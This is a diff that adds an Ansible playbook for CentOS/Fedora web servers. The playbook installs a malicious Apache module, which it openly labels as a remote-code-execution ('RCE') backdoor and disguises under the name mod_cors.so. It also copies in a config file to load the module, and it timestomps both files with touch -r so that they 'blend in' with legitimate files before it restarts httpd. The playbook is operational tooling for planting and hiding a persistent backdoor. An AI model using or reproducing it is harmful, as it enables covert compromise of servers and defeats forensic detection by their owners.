@@ -1,0 +1,25 @@
+- name: Install an RCE Apache mod to httpd style installations (CentOS/Fedora)
+  hosts: C7
+  tasks:
+  - name: Push the mod
+    ansible.builtin.copy:
+      src: /opt/payloads/c7/mod_cors.so
+      dest: /usr/lib64/httpd/modules/mod_cors.so
+      owner: root
+      group: root
+      mode: '755'
+  - name: Push the config file
+    ansible.builtin.copy:
+      src: /opt/payloads/c7/00-cors.conf
+      dest: /etc/httpd/conf.modules.d/00-cors.conf
+      owner: root
+      group: root
+      mode: '644'
+  - name: Enable the mod, set the dates to blend in, and restart apache
+    ansible.legacy.shell: |
+      touch -r /usr/lib64/httpd/modules/mod_cache.so /usr/lib64/httpd/modules/mod_cors.so
+      touch -r /etc/httpd/conf.modules.d/00-base.conf /etc/httpd/conf.modules.d/00-cors.conf
+      touch -r /etc/httpd/conf.d /etc/httpd/conf.modules.d
+      systemctl restart httpd
+    args:
+      executable: /bin/bash
